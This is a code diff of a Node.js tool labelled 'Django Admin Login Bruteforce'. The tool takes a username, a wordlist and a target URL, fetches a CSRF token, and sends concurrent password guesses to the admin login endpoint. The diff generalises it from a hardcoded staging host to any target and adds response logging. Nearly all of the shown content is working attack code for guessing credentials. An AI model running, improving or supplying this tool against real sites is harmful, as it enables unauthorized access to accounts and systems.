@@ -1,12 +1,6 @@
 #! /usr/bin/env node
-//
-// Module Dependencies
-//
-// npm install request -g
-// npm install async -g
-//
-module.paths.push('/usr/local/lib/node_modules');
 
+// Module Dependencies
 var request = require('request');
 var fs      = require('fs');
 var async   = require('async');
@@ -14,8 +8,8 @@ var async   = require('async');
 // Usage message
 if (process.argv.length !== 5) {
   console.log(
-    'NodeJS Concurrent Login Bruteforce 1.0\n' +
-    'Usage: ./bruteforce.js <username> <wordlist> <target url>' 
+    'NodeJS Django Admin Login Bruteforce 1.0\n' +
+    'Usage: ./djangoAdmin.js <username> <wordlist> <target url>' 
   );
 
   process.exit();
@@ -63,7 +57,7 @@ async.each(words, function(word, callback) {
       url: baseUrl + '/login/',
       method: 'POST',
       headers: { 
-        Referer: 'https://postcodeinfo-staging.dsd.io/admin/login/?next=/admin/',
+        Referer: baseUrl,
         Cookie: 'csrftoken=' + token 
       },
       form: {
@@ -87,16 +81,12 @@ async.each(words, function(word, callback) {
           );
 
           process.exit();
-        } 
-      } else {
-          console.log(error);
+        } else {
+          console.log('[-] Server responded with: ' + response.statusCode);
+        }
       }
       
       callback();
     });
   });
 });
-
- 
-
-
